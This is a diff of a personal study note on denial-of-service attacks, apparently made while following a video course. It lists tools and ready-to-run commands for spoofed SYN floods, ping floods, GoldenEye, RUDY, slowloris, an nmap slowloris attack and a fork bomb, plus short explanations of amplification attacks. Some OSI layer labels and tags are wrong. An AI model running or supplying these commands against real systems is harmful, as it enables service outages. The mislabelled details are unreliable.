@@ -61,8 +61,6 @@ The DOS/DDoS attacks can be done on each layer of the ISO model, dependig on the
 
 
 
-
-
 ## DOS Attack Tools
 
 ### Ping of Death
@@ -87,7 +85,7 @@ sudo hping -1 --data 65535 -f --flood <ip>
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ping -i 0.1ms -f <ip>
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
+---
 ### Keep Alive + NoCache
 **Tool:** [GoldenEye.py](https://github.com/jseidl/GoldenEye) 
 **Layer:** Network Layer (Layer 3)
@@ -100,7 +98,7 @@ git clone  https://github.com/jseidl/GoldenEye.git
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python3 golden_eye.py “http://example.com”
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
+---
 ### Low and Low (Slowloris)
 Tool: RUDY (R U Dead Yet?) 
 Layer: Network Layer (Layer 3)
@@ -119,7 +117,7 @@ npm install -g rudyjs
 ```
 rudy -t “http://example.com” -n 100 -d 5 -m “GET”
 ```
-
+---
 ### Smurf Attack
 [Lesson 61](https://www.youtube.com/watch?v=UPk2V-QXyIo&t=11s&ab_channel=NetCatTest) #SmurfAttack 
 ![[SmurfAttack1.png]]
@@ -129,7 +127,7 @@ rudy -t “http://example.com” -n 100 -d 5 -m “GET”
 >The **False IP** could be an IP located inside the target network(ServerB)
 ![[SmurfAttack2.png]]
 >The target (ServerA) will send the packet to **False IP**(ServerB) requesting an echo reply, which will make the **False IP**(ServerB) send another packet requesting an echo reply from target(ServerA), thus creating an infinite loop.
-
+---
 ### DNS Amplification
 [Lesson 62](https://www.youtube.com/watch?v=pU6IV3ng20o&ab_channel=NetCatTest) #DNSAmplification
 ![[DNSAmplification1.png]]
@@ -141,15 +139,14 @@ The attacker only have to create a small query, and the DNS will reply with a **
 - Must use a DNS query that is complex like ==ANY==
 - This if often used together with #BotNets
 ![[DNSAmplification2.png]]
-
+---
 ### NTP Amplification
 [Lesson 63](https://www.youtube.com/watch?v=hBwmL4w32bA&ab_channel=NetCatTest) #NTPAmplification
 ![[Pasted image 20250309140036.png]]
 Similar to the DNS Amplification, this time the attacker will target a vulnerable NTP(Network Time Protocol) Server.
 >Attacker will send a small request to server and receive a **MUCH BIGGER reply**
 >Attacker will reflect the attack to victim
-
-
+---
 ### TCP & SYN Flood
 [Lesson 64](https://www.youtube.com/watch?v=fIxk4tkhOFE&ab_channel=NetCatTest) #TCPFlood #SynFlood
 **Layer:** Transport Layer (Layer 4)
@@ -159,7 +156,7 @@ Similar to the DNS Amplification, this time the attacker will target a vulnerabl
 ```
 hping3 -a <spoof_IP> -p 80 --flood -S <target> --fast
 ```
-
+---
 ### HTTP Flood
 [Lesson 65](https://www.youtube.com/watch?v=F9UoHy4rX4I&ab_channel=NetCatTest) #ForkBomb
 Tool: **LOIC**
@@ -173,8 +170,7 @@ Layer: **Application Layer (Layer 7)**
 #### Install:
 > [Download LOIC](https://www.monodevelop.com/download/#fndtn-download-lin-debian) from SourceForge for Windows
 > Also available on Kali but requires more steps to install
-
-
+---
 ### HTTP Slowloris
 Tool: [slowloris](https://github.com/gkbrk/slowloris.git)
 Layer: **Network Layer (Layer 3)**
@@ -189,15 +185,14 @@ git clone https://github.com/gkbrk/slowloris.git
 ```
 python3 slowloris.py $target -s 500
 ```
-
+---
 ### Nmap Slowloris
 Alternatively we can use #nmap Script Engine to **check if server is vulnerable** or to **perform the SlowLoris attack** on the server
 - [Check if vulnerable to Slowloris](https://nmap.org/nsedoc/scripts/http-slowloris-check.html)
 ```
 sudo nmap --script http-slowloris --max-parallelism 400  192.168.0.34 -p 80 -v
 ```
-
-
+---
 ### Fork Bomb
 [Lesson 67](https://www.youtube.com/watch?v=dlF4K9cRkts&ab_channel=NetCatTest)
 ![[Pasted image 20250309230820.png]]
@@ -205,14 +200,13 @@ This is a function that will spawn other **children functions** which will eat a
 
 #### Execute:
 ```
-#This can be done with any ForLoop();
+This can be done with any ForLoop() using native BASH, DOS or Powershell
 ```
 #### Example
 ```
 :(){:|:&};:
 ```
-
-
+---
 ### UDP Flood
 ![[Pasted image 20250309231632.png]]
 
